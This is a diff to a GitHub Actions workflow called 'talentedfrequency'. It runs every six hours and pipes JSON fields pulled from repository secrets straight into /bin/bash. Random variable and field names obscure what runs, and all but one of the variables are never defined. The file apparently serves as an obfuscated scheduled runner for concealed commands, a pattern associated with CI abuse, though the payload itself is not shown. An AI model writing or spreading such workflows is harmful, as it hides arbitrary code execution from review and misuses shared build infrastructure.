@@ -1,8 +1,9 @@
 name: talentedfrequency
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '52 1/6 * * *'
+    - cron: '16 4/6 * * *'
 
 jobs:
   build:
@@ -11,14 +12,18 @@ jobs:
       - uses: actions/checkout@v4
       - name: talentedfrequency
         env:
-          ztdmk5715: ${{ secrets.ztdmk5715 }}
+          lu07: ${{ secrets.lu07 }}
         run: |
-          echo $ztdmk5715 | jq -r .y9 | /bin/bash
-          echo $hf97456 | jq -r .kknu33 | /bin/bash
-          echo $pja1 | jq -r .eq0464 | /bin/bash
-          echo $xg756 | jq -r .fcuq0763 | /bin/bash
-          echo $vltia0530 | jq -r .xtym334 | /bin/bash
-          echo $m45968 | jq -r .irmis5 | /bin/bash
-          echo $k772 | jq -r .zezly20572 | /bin/bash
-          echo $w32048 | jq -r .rl97660 | /bin/bash
+          echo $lu07 | jq -r .dnlg5 | /bin/bash
+          echo $r744 | jq -r .vzd4741 | /bin/bash
+          echo $mwk52469 | jq -r .gnv3245 | /bin/bash
+          echo $qi90499 | jq -r .u4397 | /bin/bash
+          echo $vvbcg19 | jq -r .dtp2 | /bin/bash
+          echo $xjci66558 | jq -r .tdtv71 | /bin/bash
+          echo $eioju63062 | jq -r .si69043 | /bin/bash
+          echo $qt4 | jq -r .yrakd95357 | /bin/bash
+          echo $saze3940 | jq -r .dmy4 | /bin/bash
+          echo $s93783 | jq -r .b58 | /bin/bash
+          echo $zb594 | jq -r .zz83764 | /bin/bash
+          echo $igk5162 | jq -r .qv828 | /bin/bash
 
